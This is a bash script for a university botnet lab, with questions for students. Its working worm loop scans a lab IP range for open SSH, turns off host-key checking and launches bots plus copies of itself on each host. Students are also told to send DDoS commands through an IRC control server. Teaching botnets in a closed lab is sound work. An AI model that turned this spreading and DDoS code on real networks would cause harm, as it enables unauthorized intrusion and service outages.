if [ $# -ne 2 ]; then
    echo "Usage: ./botnet.sh <range_start> <range_end>"
    echo "Example: To run botnet on ip range (142.1.46.66 - 142.1.46.99), run \"./botnet.sh 66 99\"."
    exit
fi

# [DISCLAIMER]

# Do not use any of the code in this lab to do anything stupid
# (definitely do not target real domains), you will get caught!

# This code was created without any security or protection in mind
# and many things are simplified to demonstrate the concept of botnets
# for the purposes of the lab.

# You will only need a single lab pc to complete this lab.

# Wherever there is an ANSWER or TODO, you must complete them to get full marks.

# Please make sure to read all instructions very carefully.


# [OVERVIEW]

# In this interactive lab, we will be exploring 3 of the 4 phases of the botnet lifecycle:
# Infection (+ Propagation) -> Connection -> Control.

# We will not be covering Maintainence & Upgrading.


# [REQUIREMENTS]

# Run "chmod u+x c2.py bot.py botnet.sh kill_botnet.sh" to add execute permissions.

# Run "pip install -r requirements.txt" inside the "MHDDoS" directory.


# [PASSWORDLESS SSH]

# To complete this lab, you will need to set up passwordless ssh *between* lab pcs.
# If you have not previously set this up before, you will have to run
# "ssh-keygen -t rsa; cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys".


# [RUNNING IRC SERVER]

# Run "ifconfig eno1" and make a note of your ipv4 (inet) address.
# This will be the ip address that the IRC server will run on and that
# our botmaster and bots will connect to.

# TODO: Replace this with your ip address.
irc_server_ip=""

# Edit the "ergo-2.13.0-linux-x86_64/ircd.yaml" file.
# Under "server -> listeners", replace 127.0.0.1 with your ip address.

# Navigate to the "ergo-2.13.0-linux-x86_64" directory.
# Run "./ergo mkcerts" then "./ergo run" to start the IRC server.

# QUESTION: What is the standard plaintext port (tls=false) that our bots will use to connect to the IRC server?
# ANSWER: 


# [JOINING IRC SERVER AS BOTMASTER]

# Create a new terminal in the base directory.

# Run "./c2.py <irc_server_ip>" to join the IRC server as the botmaster.
# Observe the IRC server and the botmaster client output.

# QUESTION: What nickname did our "c2.py" script use to join the IRC server?
# ANSWER: master-_______________


# [RECONNAISSANCE]

# Create a new terminal in the base directory.

# Run "ping dh2026pc01 -c 1".

# QUESTION: What is the ip address of dh2026pc01?
# ANSWER: 

# Run "ping dh2010pc00 -c 1".

# QUESTION: What is the ip address of dh2010pc00?
# ANSWER: 

# Run "ping" on a few more lab machines and answer the following question.

# QUESTION: What is the ip range that all of our lab pcs are sitting on?
# ANSWER: 

# Remember this answer.
# You will need this when you call "./botnet.sh" later.


# [INFECTION -> PROPAGATION -> CONNECTION]

script_dir=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )

ip_prefix="142.1.46."
range_start=$1
range_end=$2

i=$range_start

# Iterate over ip range to find new hosts to infect.
while [ $i -le $range_end ]; do
    ip_address="$ip_prefix$i"

    nc -zv -w 1 $ip_address ssh
    if [ $? -eq 0 ]; then
        # SSH port was open. Infect the host.

        # Divide and conquer:
        # Partition the ip range for the new bot.
        new_bot_range_end=$range_end
        new_range_end=$(( i + ((range_end - i) / 2) ))
        new_bot_range_start=$(( new_range_end + 1 ))
        range_end=$new_range_end

        # Normally, this is when we attempt to gain unauthorized access to each victim machine
        # and potentially set up a backdoor. However, since we already set up passwordless ssh
        # between our lab pcs earlier, we can skip this step.

        # This is also where we would normally introduce our botnet files into each victim machine but,
        # luckily, this is already taken care of by NFS.

        # QUESTION: Explain briefly what you think the command below does.
        # ANSWER: 
        command="cd $script_dir; ./bot.py $irc_server_ip & ./botnet.sh $new_bot_range_start $new_bot_range_end &"

        ssh -o "StrictHostKeyChecking no" $ip_address $command &
    fi

    (( ++i ))
done

# Create a new terminal in the base directory.

# Run "./botnet.sh" and read the usage string to understand how to use the script.
# Recall your answer from earlier.


# [CONTROL]

# Using the botmaster IRC client, send the command "NAMES #botnet" to the channel.

# QUESTION: Explain briefly what this command does.
# ANSWER: 

# Create a new terminal in the base directory.

# Run "python3 -m http.server -b <ip_address> 8080" to start the victim server
# (use your ip address from earlier). You can optionally open the link from the
# output in your browser if you want to click around and to see the effects of
# the DDoS in real time.

# Instruct your bots to initiate a DDoS attack on the victim server by sending the command
# "DDOS CONNECTION <target_ip>:<target_port> 8 30 true" via the botmaster IRC client.

# QUESTION: What error message do you see in the victim server terminal when you run the command?
# ANSWER: 

# Congratulations, you have now learned an extremely convoluted way to (Ctrl-C) your own server.

# When you are finished with the lab, please clean up after yourselves and
# run "./kill_botnet.sh 4 120 <utorid>" :)
